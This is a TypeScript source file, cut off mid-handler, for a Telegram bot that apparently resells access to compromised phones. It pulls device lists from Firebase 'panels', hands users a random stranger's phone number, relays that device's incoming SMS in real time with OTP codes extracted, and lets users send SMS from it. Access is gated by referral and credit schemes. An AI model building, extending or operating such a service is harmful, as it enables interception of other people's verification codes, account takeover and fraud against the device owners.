import TelegramBot from "node-telegram-bot-api";
import { db, botUsersTable, panelsTable, giftCardsTable, referralsTable } from "@workspace/db";
import { eq, and } from "drizzle-orm";
import { fetchPanelDevices, fetchDeviceSms } from "./firebase";
import { logger } from "./logger";

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
const BOT_USERNAME = process.env.BOT_USERNAME || "TBH_VIP_BOT";

// Required channels to join
const REQUIRED_CHANNELS = [
  { username: "TBH_BRAND", label: "TBH OFFICIAL" },
  { username: "TBH_X_EARNING", label: "TBH X EARNING" },
  { username: "TBH_OFFICAL_CHAT", label: "TBH OFFICIAL CHAT" },
];

let bot: TelegramBot | null = null;

export function getBot(): TelegramBot | null {
  return bot;
}

export function initBot(useWebhook = false): TelegramBot {
  if (bot) return bot;
  if (!BOT_TOKEN) {
    logger.error("TELEGRAM_BOT_TOKEN not set");
    throw new Error("TELEGRAM_BOT_TOKEN is required");
  }
  if (useWebhook) {
    bot = new TelegramBot(BOT_TOKEN, { webHook: false });
  } else {
    bot = new TelegramBot(BOT_TOKEN, { polling: true });
    logger.info("Telegram bot started with polling");
    setupHandlers(bot);
  }
  return bot;
}

export function processUpdate(update: TelegramBot.Update): void {
  if (!bot) return;
  bot.processUpdate(update);
}

// ─── Premium Emoji IDs ────────────────────────────────────────────────────────
const E = {
  lightning:    "5355051922862653659",   // ⚡
  sparkle:      "5289722755871162900",   // ✨
  rocket:       "5372917041193828849",   // 🚀
  search:       "5368309348739074032",   // 🔎
  signal:       "5352759161945867747",   // 📶
  globe:        "5372849966689566579",   // 🌐
  profile:      "5206318837489743801",   // 👤
  gift:         "5359664288241829619",   // 🎁
  coin:         "5334998226636390258",   // 🪙
  back:         "5330237710655306682",   // ↩️
  newnum:       "5319160079465857105",   // 🆕
  eye:          "6206155797722830770",   // 👁
  history:      "6206497372176913599",   // 📋
  stop:         "6206479140040743133",   // 🛑
  home:         "6204010762206189094",   // 🏠
  check:        "6206188632747808299",   // ✅
  lock:         "6206404510689007446",   // 🔒
  fire:         "6206080502651164081",   // 🔥
  star:         "6204162490515855272",   // ⭐
  phone:        "6206446249181189526",   // 📱
  crown:        "6206343625232619150",   // 👑
  money:        "6206378324273403309",   // 💰
  note:         "6206108815075579644",   // 🎵
  warn:         "6206110936789423908",   // ⚠️
  trophy:       "6203750195130274981",   // 🏆
  link:         "6025878226260202192",   // 🔗
  support:      "6026056450223116307",   // 🖥
  buy:          "5395358455768837479",   // 💳
  panel:        "6035152649790164056",   // 🖥
  tick:         "5863980370340351884",   // ✔️
  id:           "5404561694510833322",   // 🆔
  name:         "5190806721286657692",   // 📛
  joined:       "5195033767969839232",   // 📅
  expire:       "5312361253610475399",   // ⌛
  referral:     "5197269100878907942",   // 👥
  credits:      "5253742260054409879",   // 💎
  online:       "5440621591387980068",   // 🟢
  offline:      "5294048127240655242",   // 🔴
  battery:      "5291933173674957761",   // 🔋
  sim:          "6269085886177087845",   // 📲
  random:       "6017187377116614559",   // 🎲
  status_ok:    "6019476152303750898",   // 🔵
  wave:         "5247133031235329609",   // 〰️
  key:          "5249273776079640466",   // 🔑
  timer:        "5246842176050046092",   // ⏱
  total:        "5246772116543512028",   // 📊
  device:       "5237761614458933049",   // 📟
  db:           "5235588635885054955",   // 🗄
  sms:          "5258500422393415126",   // 💬
  refresh:      "5301096984617166561",   // 🔄
};

// Premium emoji tag for HTML parse mode
function em(id: string, fallback: string): string {
  return `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;
}

// ─── Small Caps ───────────────────────────────────────────────────────────────
// Converts uppercase A-Z to Unicode small caps. HTML-aware: skips text inside
// <tags> so HTML markup and emoji-ids are never corrupted.
const SC_MAP: Record<string, string> = {
  A:"ᴀ", B:"ʙ", C:"ᴄ", D:"ᴅ", E:"ᴇ", F:"ꜰ", G:"ɢ", H:"ʜ", I:"ɪ",
  J:"ᴊ", K:"ᴋ", L:"ʟ", M:"ᴍ", N:"ɴ", O:"ᴏ", P:"ᴘ", Q:"ǫ", R:"ʀ",
  S:"ꜱ", T:"ᴛ", U:"ᴜ", V:"ᴠ", W:"ᴡ", X:"x",  Y:"ʏ", Z:"ᴢ",
};

// HTML-aware small caps: skips content inside < > angle brackets
function sc(html: string): string {
  let out = "";
  let inTag = false;
  for (let i = 0; i < html.length; i++) {
    const c = html[i];
    if (c === "<")       { inTag = true;  out += c; }
    else if (c === ">")  { inTag = false; out += c; }
    else if (inTag)      { out += c; }
    else                 { out += SC_MAP[c] ?? c; }
  }
  return out;
}

// Plain-text small caps (for button text — no HTML)
function sct(text: string): string {
  return text.split("").map(c => SC_MAP[c] ?? c).join("");
}

// ─── Keyboards ────────────────────────────────────────────────────────────────
// Telegram Bot API fields on KeyboardButton:
//   style: "success" (green) | "danger" (red) | "primary" (blue)
//   icon_custom_emoji_id: premium emoji ID shown BEFORE the button text

type KBtn = TelegramBot.KeyboardButton & {
  style?: "success" | "danger" | "primary";
  icon_custom_emoji_id?: string;
};
type KRow = KBtn[];
type CKeyboard = { keyboard: KRow[]; resize_keyboard: boolean; is_persistent?: boolean };

function btn(
  text: string,
  style: "success" | "danger" | "primary",
  emojiId: string
): KBtn {
  return { text: sct(text), style, icon_custom_emoji_id: emojiId };
}

function mainMenuKeyboard(): CKeyboard {
  return {
    keyboard: [
      [
        btn("GET NUMBER",          "success", E.lightning),
        btn("WEB PANEL",           "primary", E.sparkle),
      ],
      [
        btn("SUPPORT ( DEVELOPER )", "danger", E.support),
      ],
      [
        btn("SEARCH NUMBER",       "primary", E.search),
        btn("BUY CREDIT",          "success", E.buy),
      ],
      [
        btn("STATUS",              "primary", E.globe),
        btn("PROFILE",             "primary", E.profile),
      ],
      [
        btn("GIFT CARD",           "success", E.gift),
        btn("REFER & EARN",        "success", E.coin),
      ],
      [
        btn("BACK",                "danger",  E.back),
      ],
    ],
    resize_keyboard: true,
    is_persistent: true,
  };
}

function numberMenuKeyboard(): CKeyboard {
  return {
    keyboard: [
      [
        btn("NEW NUMBER",          "success", E.newnum),
        btn("WATCH SMS",           "success", E.eye),
      ],
      [
        btn("SMS HISTORY",         "primary", E.history),
        btn("STOP WATCH",          "danger",  E.stop),
      ],
      [
        btn("SEND SMS",            "primary", E.signal),
        btn("NUMBERS HISTORY",     "primary", E.history),
      ],
      [
        btn("BACK",                "danger",  E.back),
      ],
    ],
    resize_keyboard: true,
    is_persistent: true,
  };
}

function watchMenuKeyboard(): CKeyboard {
  return {
    keyboard: [
      [
        btn("STOP WATCH",          "danger",  E.stop),
        btn("SMS HISTORY",         "primary", E.history),
      ],
      [
        btn("BACK",                "danger",  E.back),
      ],
    ],
    resize_keyboard: true,
    is_persistent: true,
  };
}

function cancelKeyboard(): CKeyboard {
  return {
    keyboard: [
      [ btn("CANCEL", "danger", E.back) ],
    ],
    resize_keyboard: true,
    is_persistent: true,
  };
}

// ─── Helpers ──────────────────────────────────────────────────────────────────

function divider(): string {
  return "〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️";
}

function generateReferralCode(telegramId: string): string {
  return `ref_${telegramId}`;
}

async function getOrCreateUser(msg: TelegramBot.Message, referredBy?: string | null) {
  const telegramId = String(msg.from!.id);
  const [existing] = await db
    .select()
    .from(botUsersTable)
    .where(eq(botUsersTable.telegramId, telegramId));

  if (existing) return existing;

  const expiresAt = new Date(Date.now() + 60 * 60 * 1000);
  const [user] = await db
    .insert(botUsersTable)
    .values({
      telegramId,
      username: msg.from?.username || null,
      firstName: msg.from?.first_name || "User",
      referralCode: generateReferralCode(telegramId),
      referredBy: referredBy || null,
      getNumberExpiresAt: expiresAt,
    })
    .returning();

  if (referredBy) {
    const [referrer] = await db
      .select()
      .from(botUsersTable)
      .where(eq(botUsersTable.referralCode, referredBy));

    if (referrer) {
      const newCount = referrer.referralCount + 1;
      const now = new Date();

      const currentExpiry = referrer.getNumberExpiresAt
        ? new Date(Math.max(referrer.getNumberExpiresAt.getTime(), now.getTime()))
        : now;
      const newExpiry = new Date(currentExpiry.getTime() + 12 * 60 * 60 * 1000);

      const sendSmsUnlocked = newCount >= 10 ? true : referrer.sendSmsUnlocked;
      const newSmsCredits =
        newCount >= 10 && !referrer.sendSmsUnlocked
          ? referrer.smsCredits + 500
          : newCount > 10
          ? referrer.smsCredits + 100
          : referrer.smsCredits;

      let webPanelExpiry = referrer.webPanelExpiresAt;
      if (newCount === 10) {
        const webBase = webPanelExpiry
          ? new Date(Math.max(webPanelExpiry.getTime(), now.getTime()))
          : now;
        webPanelExpiry = new Date(webBase.getTime() + 24 * 60 * 60 * 1000);
      } else if (newCount > 10 && webPanelExpiry) {
        const webBase = new Date(Math.max(webPanelExpiry.getTime(), now.getTime()));
        webPanelExpiry = new Date(webBase.getTime() + 12 * 60 * 60 * 1000);
      }

      await db
        .update(botUsersTable)
        .set({ referralCount: newCount, getNumberExpiresAt: newExpiry, sendSmsUnlocked, smsCredits: newSmsCredits, webPanelExpiresAt: webPanelExpiry })
        .where(eq(botUsersTable.id, referrer.id));

      await db.insert(referralsTable).values({ referrerId: referrer.id, referredTelegramId: telegramId });
    }
  }

  return user;
}

async function hasGetNumberAccess(user: { getNumberExpiresAt: Date | null }): Promise<boolean> {
  if (!user.getNumberExpiresAt) return false;
  return user.getNumberExpiresAt > new Date();
}

async function getAllOnlineDevices() {
  const panels = await db.select().from(panelsTable);
  const all = [];
  for (const panel of panels) {
    const devices = await fetchPanelDevices(panel.firebaseUrl, panel.secretKey, panel.id, panel.name);
    all.push(...devices.filter((d) => d.status));
  }
  return all;
}

// Watch polling: userId → intervalId
const watchIntervals = new Map<string, NodeJS.Timeout>();
const watchLastSms   = new Map<string, string>();

// ─── Handlers ─────────────────────────────────────────────────────────────────

function setupHandlers(bot: TelegramBot) {
  // Auto-applies sc() small-caps + defaults parse_mode to HTML
  const send = (cid: number, html: string, opts: Record<string, any> = {}) =>
    bot.sendMessage(cid, sc(html), { parse_mode: "HTML", ...opts });

  bot.on("message", async (msg) => {
    if (!msg.from || !msg.text) return;
    const chatId     = msg.chat.id;
    const text       = msg.text.trim();
    const telegramId = String(msg.from.id);

    try {
      // ── /start ──────────────────────────────────────────────────────────
      if (text.startsWith("/start")) {
        const param      = text.split(" ")[1] || null;
        const referredBy = param?.startsWith("ref_") ? param : null;
        const user       = await getOrCreateUser(msg, referredBy);

        // Welcome message with premium emoji
        await send(
          chatId,
          `${em(E.lightning, "⚡")} <b>TBH VIP BOT</b> ${em(E.lightning, "⚡")}\n` +
          `${divider()}\n\n` +
          `${em(E.sparkle, "✨")} <b>WELCOME TO TBH VIP BOT!</b>\n\n` +
          `${em(E.lightning, "⚡")} <b>AAPKO 1 GHANTE KE LIYE GET NUMBER FREE MILA!</b>\n` +
          `KOI LIMIT NAHI — 1HR TAK FULL ACCESS.\n\n` +
          `${em(E.expire, "⌛")} 1HR KE BAAD GET NUMBER LOCK HO JAYEGA.\n` +
          `${em(E.coin, "🪙")} REFER KARO AUR EXTRA HOURS PAO!`,
          { parse_mode: "HTML", reply_markup: { remove_keyboard: true } }
        );

        // Channel join verification
        const channelButtons = REQUIRED_CHANNELS.map((ch) => [
          { text: `${em(E.check, "✅")} ${ch.label}`, url: `https://t.me/${ch.username}` } as any,
        ]);
        channelButtons.push([
          { text: `${em(E.check, "✅")} I JOINED — CHECK NOW`, callback_data: "check_joined" } as any,
        ]);

        await send(
          chatId,
          `${em(E.lock, "🔒")} <b>CHANNEL VERIFICATION REQUIRED</b>\n` +
          `${divider()}\n\n` +
          `TBH VIP BOT KA FULL ACCESS PANE KE LIYE\n` +
          `NICHE DIYE GAYE SABHI OFFICIAL CHANNELS JOIN KARO.\n\n` +
          `${em(E.check, "✅")} CHANNELS JOIN KARNE KE BAAD <b>I JOINED — CHECK NOW</b> BUTTON DABAO.`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: channelButtons,
            },
          }
        );
        return;
      }

      // ── Fetch user ───────────────────────────────────────────────────────
      const [user] = await db
        .select()
        .from(botUsersTable)
        .where(eq(botUsersTable.telegramId, telegramId));

      if (!user) {
        await send(chatId, "Please send /start to begin.");
        return;
      }

      // ── Main menu navigation ─────────────────────────────────────────────

      if (text === "GET NUMBER") {
        const hasAccess = await hasGetNumberAccess(user);
        if (!hasAccess) {
          await send(
            chatId,
            `${em(E.expire, "⌛")} <b>GET NUMBER ACCESS EXPIRED!</b>\n\n` +
            `ACCESS KHATAM HO GAYA.\n` +
            `${em(E.coin, "🪙")} HAR REFERRAL = +12HR ACCESS\n\n` +
            `REFER & EARN DABAO AUR LINK SHARE KARO.`,
            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
          );
          return;
        }

        await send(
          chatId,
          `${em(E.lightning, "⚡")} <b>GENERATING A RANDOM NUMBER...</b>`,
          { parse_mode: "HTML" }
        );

        const onlineDevices = await getAllOnlineDevices();
        if (onlineDevices.length === 0) {
          await send(
            chatId,
            `${em(E.offline, "🔴")} <b>NO ACTIVE NUMBERS RIGHT NOW!</b>\n\n` +
            `${em(E.refresh, "🔄")} THODI DER BAAD DOBARA TRY KARO — NUMBERS REGULARLY ACTIVE HOTE HAIN.`,
            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
          );
          return;
        }

        const device = onlineDevices[Math.floor(Math.random() * onlineDevices.length)];

        await db
          .update(botUsersTable)
          .set({ assignedDeviceId: device.id, assignedPanelId: device.panelId, state: "number_menu" })
          .where(eq(botUsersTable.id, user.id));

        const remainingMs  = user.getNumberExpiresAt ? Math.max(0, user.getNumberExpiresAt.getTime() - Date.now()) : 0;
        const remainingMin = Math.floor(remainingMs / 60000);

        await send(
          chatId,
          `${em(E.lightning, "⚡")} <b>RANDOM NUMBER GENERATED!</b>\n` +
          `${divider()}\n\n` +
          `${em(E.id, "🆔")} <b>DEVICE ID</b>   : N${device.id}\n` +
          `${em(E.phone, "📱")} <b>NUMBER</b>     : ${device.phoneNumber || "Unknown"}\n` +
          `${em(E.profile, "👤")} <b>DEVICE NAME</b> : ${device.model || device.id}\n` +
          `${em(E.db, "🗄")} <b>DATABASE</b>   : ${device.panelId}\n` +
          `${em(E.lightning, "⚡")} <b>STATUS</b>     : ${em(E.check, "✅")} ONLINE\n` +
          `${em(E.battery, "🔋")} <b>BATTERY</b>    : ${device.battery || "—"}\n` +
          `${divider()}\n\n` +
          `${em(E.timer, "⏱")} ACCESS — ${remainingMin}m REMAINING\n` +
          `${em(E.history, "📋")} YOU CAN VIEW THIS NUMBER IN YOUR SMS HISTORY ANYTIME.`,
          { parse_mode: "HTML", reply_markup: numberMenuKeyboard() as any }
        );
        return;
      }

      if (text === "NEW NUMBER") {
        const hasAccess = await hasGetNumberAccess(user);
        if (!hasAccess) {
          await send(
            chatId,
            `${em(E.expire, "⌛")} <b>ACCESS EXPIRED!</b> Refer karke access badhao.`,
            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
          );
          return;
        }

        await send(
          chatId,
          `${em(E.lightning, "⚡")} <b>GENERATING A RANDOM NUMBER...</b>`,
          { parse_mode: "HTML" }
        );

        const onlineDevices = await getAllOnlineDevices();
        if (onlineDevices.length === 0) {
          await send(
            chatId,
            `${em(E.offline, "🔴")} <b>NO ACTIVE NUMBERS RIGHT NOW!</b>\n\n` +
            `${em(E.refresh, "🔄")} THODI DER BAAD DOBARA TRY KARO.`,
            { parse_mode: "HTML", reply_markup: numberMenuKeyboard() as any }
          );
          return;
        }

        const device = onlineDevices[Math.floor(Math.random() * onlineDevices.length)];

        await db
          .update(botUsersTable)
          .set({ assignedDeviceId: device.id, assignedPanelId: device.panelId })
          .where(eq(botUsersTable.id, user.id));

        const remainingMs  = user.getNumberExpiresAt ? Math.max(0, user.getNumberExpiresAt.getTime() - Date.now()) : 0;
        const remainingMin = Math.floor(remainingMs / 60000);

        await send(
          chatId,
          `${em(E.lightning, "⚡")} <b>RANDOM NUMBER GENERATED!</b>\n` +
          `${divider()}\n\n` +
          `${em(E.id, "🆔")} <b>DEVICE ID</b>   : N${device.id}\n` +
          `${em(E.phone, "📱")} <b>NUMBER</b>     : ${device.phoneNumber || "Unknown"}\n` +
          `${em(E.profile, "👤")} <b>DEVICE NAME</b> : ${device.model || device.id}\n` +
          `${em(E.db, "🗄")} <b>DATABASE</b>   : ${device.panelId}\n` +
          `${em(E.lightning, "⚡")} <b>STATUS</b>     : ${em(E.check, "✅")} ONLINE\n` +
          `${em(E.battery, "🔋")} <b>BATTERY</b>    : ${device.battery || "—"}\n` +
          `${divider()}\n\n` +
          `${em(E.timer, "⏱")} ACCESS — ${remainingMin}m REMAINING\n` +
          `${em(E.history, "📋")} YOU CAN VIEW THIS NUMBER IN YOUR SMS HISTORY ANYTIME.`,
          { parse_mode: "HTML", reply_markup: numberMenuKeyboard() as any }
        );
        return;
      }

      if (text === "WATCH SMS") {
        if (!user.assignedDeviceId || !user.assignedPanelId) {
          await send(chatId, "First GET NUMBER dabao.", { reply_markup: mainMenuKeyboard() as any });
          return;
        }

        const [panel] = await db.select().from(panelsTable).where(eq(panelsTable.id, user.assignedPanelId));
        if (!panel) {
          await send(chatId, "Panel not found.", { reply_markup: mainMenuKeyboard() as any });
          return;
        }

        const existing = watchIntervals.get(telegramId);
        if (existing) clearInterval(existing);

        await send(
          chatId,
          `${em(E.eye, "👁")} <b>WATCHING FOR OTPS...</b>\n` +
          `${divider()}\n\n` +
          `${em(E.phone, "📱")} <b>NUMBER:</b> ${user.assignedDeviceId}\n\n` +
          `NEW OTP/SMS WILL ARRIVE HERE IN REAL-TIME.\n` +
          `${em(E.warn, "⚠️")} SPAM / RECHARGE SMS ARE AUTO-BLOCKED.\n\n` +
          `${em(E.stop, "🛑")} TAP <b>STOP WATCH</b> TO STOP.`,
          { parse_mode: "HTML", reply_markup: watchMenuKeyboard() as any }
        );

        const intervalId = setInterval(async () => {
          try {
            const msgs = await fetchDeviceSms(panel.firebaseUrl, panel.secretKey, user.assignedDeviceId!);
            if (msgs.length === 0) return;
            const latest = msgs[0];
            const key    = `${latest.sender}:${latest.text}:${latest.time}`;
            if (key !== watchLastSms.get(telegramId)) {
              watchLastSms.set(telegramId, key);
              const otp = latest.text.match(/\b\d{4,8}\b/)?.[0];
              await send(
                chatId,
                `${em(E.sms, "💬")} <b>NEW SMS RECEIVED!</b>\n\n` +
                `From: <code>${latest.sender}</code>\nTime: ${latest.time}\n\n${latest.text}` +
                (otp ? `\n\n${em(E.key, "🔑")} <b>OTP: ${otp}</b>` : ""),
                { parse_mode: "HTML", reply_markup: watchMenuKeyboard() as any }
              );
            }
          } catch (err) {
            logger.error({ err }, "Watch SMS polling error");
          }
        }, 10000);

        watchIntervals.set(telegramId, intervalId);
        await db.update(botUsersTable).set({ state: "watching" }).where(eq(botUsersTable.id, user.id));
        return;
      }

      if (text === "STOP WATCH") {
        const iv = watchIntervals.get(telegramId);
        if (iv) { clearInterval(iv); watchIntervals.delete(telegramId); watchLastSms.delete(telegramId); }
        await db.update(botUsersTable).set({ state: "number_menu" }).where(eq(botUsersTable.id, user.id));
        await send(
          chatId,
          `${em(E.stop, "🛑")} <b>WATCH STOPPED.</b>`,
          { parse_mode: "HTML", reply_markup: numberMenuKeyboard() as any }
        );
        return;
      }

      if (text === "SMS HISTORY") {
        if (!user.assignedDeviceId || !user.assignedPanelId) {
          await send(chatId, "First GET NUMBER dabao.", { reply_markup: mainMenuKeyboard() as any });
          return;
        }
        const [panel] = await db.select().from(panelsTable).where(eq(panelsTable.id, user.assignedPanelId));
        if (!panel) {
          await send(chatId, "Panel not found.", { reply_markup: numberMenuKeyboard() as any });
          return;
        }
        const messages = await fetchDeviceSms(panel.firebaseUrl, panel.secretKey, user.assignedDeviceId);
        if (messages.length === 0) {
          await send(
            chatId,
            `${em(E.history, "📋")} <b>NO SMS HISTORY FOUND.</b>`,
            { parse_mode: "HTML", reply_markup: numberMenuKeyboard() as any }
          );
          return;
        }
        const lines = messages
          .slice(0, 10)
          .map((m, i) => `${i + 1}. <b>${m.sender}</b>\n   ${m.time}\n   ${m.text.slice(0, 100)}`)
          .join("\n\n");

        await send(
          chatId,
          `${em(E.history, "📋")} <b>SMS HISTORY (${messages.length} msgs)</b>\n${divider()}\n\n${lines}`,
          { parse_mode: "HTML", reply_markup: numberMenuKeyboard() as any }
        );
        return;
      }

      if (text === "NUMBERS HISTORY") {
        if (!user.assignedDeviceId || !user.assignedPanelId) {
          await send(chatId, "Koi number assign nahi hai abhi.", { reply_markup: mainMenuKeyboard() as any });
          return;
        }
        await send(
          chatId,
          `${em(E.history, "📋")} <b>NUMBERS HISTORY</b>\n${divider()}\n\n` +
          `${em(E.phone, "📱")} <b>LAST ASSIGNED:</b> N${user.assignedDeviceId}\n` +
          `${em(E.db, "🗄")} <b>PANEL ID:</b> ${user.assignedPanelId}`,
          { parse_mode: "HTML", reply_markup: numberMenuKeyboard() as any }
        );
        return;
      }

      if (text === "STATUS") {
        const panels = await db.select().from(panelsTable);
        let totalOnline = 0, totalOffline = 0, totalDevices = 0;
        for (const panel of panels) {
          const devices = await fetchPanelDevices(panel.firebaseUrl, panel.secretKey, panel.id, panel.name);
          totalOnline  += devices.filter((d) => d.status).length;
          totalOffline += devices.filter((d) => !d.status).length;
          totalDevices += devices.length;
        }

        await send(
          chatId,
          `${em(E.globe, "🌐")} <b>STATUS REPORT</b>\n` +
          `${divider()}\n\n` +
          `${em(E.total, "📊")} <b>ALL PANELS — TOTAL</b>\n` +
          `${em(E.check, "✅")} <b>ONLINE</b>      : ${totalOnline}\n` +
          `${em(E.fire, "🔥")} <b>OFFLINE</b>     : ${totalOffline}\n` +
          `${em(E.total, "📊")} <b>GRAND TOTAL</b> : ${totalDevices}\n\n` +
          `${em(E.rocket, "🚀")} <b>LIVE DATA</b>`,
          { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
        );
        return;
      }

      if (text === "SEARCH NUMBER") {
        const panels = await db.select().from(panelsTable);
        let totalOnline = 0;
        for (const panel of panels) {
          const devs = await fetchPanelDevices(panel.firebaseUrl, panel.secretKey, panel.id, panel.name);
          totalOnline += devs.filter((d) => d.status).length;
        }
        await db.update(botUsersTable).set({ state: "search_number" }).where(eq(botUsersTable.id, user.id));
        await send(
          chatId,
          `${em(E.search, "🔎")} <b>SEARCH NUMBER</b>\n` +
          `${divider()}\n\n` +
          `${em(E.globe, "🌐")} ALL PANELS CONNECTED. CURRENTLY <b>${totalOnline}</b> ONLINE NUMBERS LOADED.\n\n` +
          `ENTER THE PHONE NUMBER YOU WANT TO SEARCH:\n` +
          `Example: <code>9876543210</code>\n\n` +
          `Tap ${em(E.back, "↩️")} <b>CANCEL</b> to go back.`,
          { parse_mode: "HTML", reply_markup: cancelKeyboard() as any }
        );
        return;
      }

      if (text === "REFER & EARN") {
        const expiryStr = user.getNumberExpiresAt && user.getNumberExpiresAt > new Date()
          ? `${em(E.check, "✅")} ACTIVE — ${Math.max(0, Math.floor((user.getNumberExpiresAt.getTime() - Date.now()) / 60000))}m remaining`
          : `${em(E.offline, "🔴")} EXPIRED`;

        const webStatus = user.webPanelExpiresAt && user.webPanelExpiresAt > new Date()
          ? `${em(E.check, "✅")} ACTIVE — ${Math.floor((user.webPanelExpiresAt.getTime() - Date.now()) / 3600000)}hr remaining`
          : `${em(E.lock, "🔒")} LOCKED — ${10 - Math.min(user.referralCount, 10)} aur referrals (${user.referralCount}/10)`;

        const sendStatus = user.sendSmsUnlocked
          ? `${em(E.check, "✅")} UNLOCKED — ${user.smsCredits} credits`
          : `${em(E.lock, "🔒")} LOCKED — ${10 - Math.min(user.referralCount, 10)} aur referrals (${user.referralCount}/10)`;

        const referralLink = `https://t.me/${BOT_USERNAME}?start=${user.referralCode}`;

        await send(
          chatId,
          `${em(E.referral, "👥")} <b>REFERRAL SYSTEM</b>\n` +
          `${divider()}\n\n` +
          `${em(E.link, "🔗")} <b>AAPKA REFERRAL LINK:</b>\n` +
          `<code>${referralLink}</code>\n\n` +
          `${divider()}\n` +
          `${em(E.referral, "👥")} <b>TOTAL REFERRALS:</b> ${user.referralCount}\n\n` +
          `${em(E.phone, "📱")} <b>GET NUMBER</b>\n${expiryStr}\n\n` +
          `${em(E.signal, "📶")} <b>SEND SMS</b>\n${sendStatus}\n\n` +
          `${em(E.panel, "🖥")} <b>WEB PANEL</b>\n${webStatus}\n\n` +
          `${divider()}\n` +
          `${em(E.crown, "👑")} <b>RULES:</b>\n` +
          `• 1st referral = +12hr Get Number\n` +
          `• Har referral = +12hr (cumulative)\n` +
          `• 10 referrals = Send SMS unlock + 500 credits\n` +
          `• 10 referrals = Web Panel unlock + 24hr access`,
          { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
        );
        return;
      }

      if (text === "GIFT CARD") {
        await db.update(botUsersTable).set({ state: "gift_card" }).where(eq(botUsersTable.id, user.id));
        await send(
          chatId,
          `${em(E.gift, "🎁")} <b>GIFT CARD REDEEM</b>\n` +
          `${divider()}\n\n` +
          `Apna gift code send karein:\nExample: <code>GIFT-AB3X7K</code>\n\n` +
          `${em(E.check, "✅")} Valid code redeem karne pe aapko Get Number access milega.`,
          { parse_mode: "HTML", reply_markup: cancelKeyboard() as any }
        );
        return;
      }

      if (text === "WEB PANEL") {
        if (user.referralCount < 10) {
          await send(
            chatId,
            `${em(E.panel, "🖥")} <b>WEB PANEL — LOCKED!</b>\n\n` +
            `${em(E.lock, "🔒")} Web unlock karne ke liye <b>${10 - user.referralCount} REFERRALS AUR KARO!</b>\n\n` +
            `${em(E.referral, "👥")} AAPKE TOTAL REFERRALS: ${user.referralCount}\n` +
            `${em(E.coin, "🪙")} REFER KARO, EARN KARO!`,
            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
          );
          return;
        }

        const hasWebAccess = user.webPanelExpiresAt && user.webPanelExpiresAt > new Date();
        if (!hasWebAccess) {
          await send(
            chatId,
            `${em(E.panel, "🖥")} <b>WEB PANEL — ACCESS EXPIRED!</b>\n\nWeb panel access khatam ho gaya. Refer karo to extend karo.`,
            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
          );
          return;
        }

        const webUrl = process.env.REPLIT_DEV_DOMAIN
          ? `https://${process.env.REPLIT_DEV_DOMAIN}`
          : "https://your-domain.repl.co";

        await send(
          chatId,
          `${em(E.panel, "🖥")} <b>WEB PANEL ACCESS GRANTED!</b>\n\n` +
          `${em(E.link, "🔗")} <a href="${webUrl}">Click here to open Web Panel</a>\n\n` +
          `${em(E.timer, "⏱")} Access expires: ${user.webPanelExpiresAt?.toLocaleString("en-IN")}`,
          { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
        );
        return;
      }

      if (text === "SEND SMS") {
        if (!user.sendSmsUnlocked) {
          await send(
            chatId,
            `${em(E.lock, "🔒")} <b>SEND SMS LOCKED</b>\n\n` +
            `SMS bhejne ke liye <b>10 referrals</b> complete karo.\n` +
            `Abhi tak: ${user.referralCount}/10\n` +
            `${em(E.coin, "🪙")} Refer & Earn button se link share karo.`,
            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
          );
          return;
        }

        if (user.smsCredits <= 0) {
          await send(
            chatId,
            `${em(E.signal, "📶")} <b>SEND SMS</b>\n\nAapke paas 0 SMS credits hain.\nReferrals karo to credits earn karo.`,
            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
          );
          return;
        }

        await send(
          chatId,
          `${em(E.signal, "📶")} <b>SEND SMS</b>\n` +
          `${divider()}\n\n` +
          `${em(E.credits, "💎")} Aapke paas <b>${user.smsCredits}</b> SMS credits hain.\n\n` +
          `Format: <code>NUMBER|MESSAGE</code>\nExample: <code>9876543210|Hello, test message</code>\n\n` +
          `Tap ${em(E.back, "↩️")} <b>CANCEL</b> to go back.`,
          { parse_mode: "HTML", reply_markup: cancelKeyboard() as any }
        );
        await db.update(botUsersTable).set({ state: "send_sms" }).where(eq(botUsersTable.id, user.id));
        return;
      }

      if (text === "PROFILE") {
        const getNum = user.getNumberExpiresAt && user.getNumberExpiresAt > new Date()
          ? `${em(E.check, "✅")} ACTIVE — ${Math.max(0, Math.floor((user.getNumberExpiresAt.getTime() - Date.now()) / 60000))}m`
          : `${em(E.offline, "🔴")} EXPIRED`;

        const webPanel = user.webPanelExpiresAt && user.webPanelExpiresAt > new Date()
          ? `${em(E.check, "✅")} ACTIVE`
          : `${em(E.lock, "🔒")} LOCKED`;

        const sendSms = user.sendSmsUnlocked
          ? `${em(E.check, "✅")} UNLOCKED`
          : `${em(E.lock, "🔒")} LOCKED`;

        await send(
          chatId,
          `${em(E.profile, "👤")} <b>MY PROFILE</b>\n` +
          `${divider()}\n\n` +
          `${em(E.name, "📛")} <b>NAME</b>   : ${user.firstName}\n` +
          `${em(E.id, "🆔")} <b>ID</b>     : ${user.telegramId}\n` +
          `${em(E.joined, "📅")} <b>JOINED</b> : ${user.createdAt?.toLocaleDateString("en-IN") || "N/A"}\n` +
          `${divider()}\n\n` +
          `${em(E.phone, "📱")} <b>GET NUMBER</b> : ${getNum}\n` +
          `${em(E.panel, "🖥")} <b>WEB PANEL</b>  : ${webPanel}\n` +
          `${em(E.signal, "📶")} <b>SEND SMS</b>   : ${sendSms}\n` +
          `${divider()}\n\n` +
          `${em(E.referral, "👥")} <b>REFERRALS</b> : ${user.referralCount}\n` +
          `${em(E.credits, "💎")} <b>CREDITS</b>   : ${user.smsCredits}`,
          { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
        );
        return;
      }

      if (text === "BUY CREDIT") {
        await send(
          chatId,
          `${em(E.buy, "💳")} <b>BUY CREDIT</b>\n` +
          `${divider()}\n\n` +
          `${em(E.money, "💰")} <b>PACKAGE SELECT KARO — UPI QR AUTO-GENERATE HOGA:</b>\n\n` +
